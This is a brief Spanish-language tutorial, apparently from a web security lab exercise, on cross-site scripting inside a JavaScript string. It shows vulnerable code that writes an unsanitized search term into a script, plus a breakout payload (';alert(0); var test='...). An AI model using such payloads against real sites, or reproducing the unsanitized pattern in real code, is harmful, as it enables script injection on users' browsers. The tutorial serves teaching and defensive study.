En este caso manipulamos los valores de variables sin sanitizar en el código java script modificandolo para inyectar nuestro código.
Supongamos que tengamos este codigo en la pagina web y que cuando pasemos un parámetro en este caso [test] este no este sanitizado , pues al tener control sobre el valor de esta variable pudiéremos insertar nuestro código 
```
<script>
  var searchTerms = 'test';
  document.write('<img src="/resources/images/tracker.gif searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

```

Iríamos probando hasta encontrar la inyección correcta que se ajuste al código aquí vemos que al pasar el parámetro alert se nos crea un error de sintaxis  el cual corregiremos pasando los valores correctos para que se ejecute
```
<script>
   var searchTerms = ''alert(0)';
   document.write('<img src="/resources/images/tracker.gif?    searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Pasando por parametros 
```
';alert(0); var test='loquesea
```

La idea es que con el parámetro introducido la estructura del JavaScript tenga sentido 